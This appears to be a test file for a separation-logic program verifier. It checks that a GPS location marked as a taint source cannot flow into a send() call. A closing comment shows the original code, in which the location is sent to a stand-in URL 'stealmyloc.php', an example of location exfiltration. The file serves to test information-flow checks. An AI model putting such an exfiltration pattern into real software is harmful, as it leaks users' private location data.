data location{int info;}
data cell{location loc;}

pred_prim source<b:bool>;

location getGPSLocation()
  requires true
  ensures  res::location<_> * res::source<false>;
//  ensures  res::location<_> * res::source<true>;

void send(location x, int location)
  requires x::location<_> * x::source<b> & !b
  ensures true;

void test_taint(cell d, bool R, int loc)
  requires d::cell<_> * d::source<b> & !b
  ensures  true;
{
  location x = null;
  if(R) x = getGPSLocation();
  d.loc = x; 
  dprint;
  if(R) send(d.loc, loc);
}

/*
Data d = new Data();
Location x = null;
if(R) x = getGPSLocation();
d.loc = x ;
if(R) send(d.loc, "http://xue.com/stealmyloc.php");
*/
